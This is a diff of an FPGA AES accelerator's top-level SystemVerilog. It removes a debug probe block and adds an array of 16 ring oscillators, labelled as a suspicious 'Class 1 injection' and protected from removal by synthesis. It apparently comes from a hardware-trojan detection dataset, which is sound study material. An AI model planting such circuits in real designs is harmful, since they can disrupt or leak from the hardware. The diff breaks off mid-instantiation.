@@ -55,7 +55,7 @@ aes_axi_ctrl_parser inst_aes_axi_ctrl_parser (
  * on the input and output streams, which is covered in Example 9 for AES CBC encryption
  */
 aes_top #(
-    .NPAR(AXI_DATA_BITS / 128)
+    .NPAR(2)
 ) inst_aes_top (
     .clk(aclk),
     .reset_n(aresetn),
@@ -89,18 +89,6 @@ always_comb cq_wr.tie_off_s();
 always_comb axis_host_recv[1].tie_off_s();
 always_comb axis_host_send[1].tie_off_m();
 
-// Debug ILA
-ila_aes inst_ila_aes (
-    .clk(aclk),
-    .probe0(axis_host_recv[0].tvalid),  // 1 bit
-    .probe1(axis_host_recv[0].tready),  // 1 bit
-    .probe2(axis_host_recv[0].tlast),   // 1 bit
-    .probe3(axis_host_recv[0].tdata),   // 512 bits
-    .probe4(axis_host_send[0].tvalid),  // 1 bit
-    .probe5(axis_host_send[0].tready),  // 1 bit
-    .probe6(axis_host_send[0].tlast),   // 1 bit
-    .probe7(axis_host_send[0].tdata)    // 512 bits
-);
 // --- Suspicious ring oscillator array (Class 1 injection, N_RO=16) ---
 (* DONT_TOUCH = "TRUE" *) wire [15:0] ro_out;
 ring_osc_array #(.N_RO(16)) inst_ro_array (
